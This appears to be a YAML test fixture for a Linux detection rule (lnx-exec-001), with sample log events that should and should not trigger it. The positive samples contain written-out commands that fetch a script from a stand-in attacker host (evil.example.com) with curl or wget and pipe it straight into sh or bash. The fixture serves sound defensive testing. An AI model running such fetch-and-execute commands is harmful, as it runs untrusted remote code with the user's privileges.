rule: lnx-exec-001

positive:
  - description: drive-by curl piped to sh
    event:
      ident: bash
      full_log: 'invoked: curl -fsSL https://evil.example.com/payload.sh | sh by uid=0'
  - description: wget piped to bash
    event:
      ident: bash
      full_log: 'invoked: wget -qO- https://evil.example.com/x.sh | bash by uid=1000'
  - description: curl piped to /bin/sh explicitly
    event:
      ident: audit
      full_log: 'type=EXECVE msg=audit: bash -c " curl -s https://evil/x | /bin/sh"'

negative:
  - description: routine curl with no pipe to shell
    event:
      ident: bash
      full_log: 'invoked: curl -fsSL https://api.example.com/health > /tmp/health.json'
  - description: routine wget download to a file
    event:
      ident: bash
      full_log: 'invoked: wget -O /tmp/release.tar.gz https://releases.example.com/v1.tar.gz'
  - description: a log quoting "| sh" inside a tutorial, no curl/wget
    event:
      ident: docs
      full_log: 'help reference: ls /etc | sh -c "wc -l" lists files into wc'
  - description: pipe to shell from a build tool, no remote download
    event:
      ident: make
      full_log: 'make: cat /tmp/script.sh | sh runs the local generator'
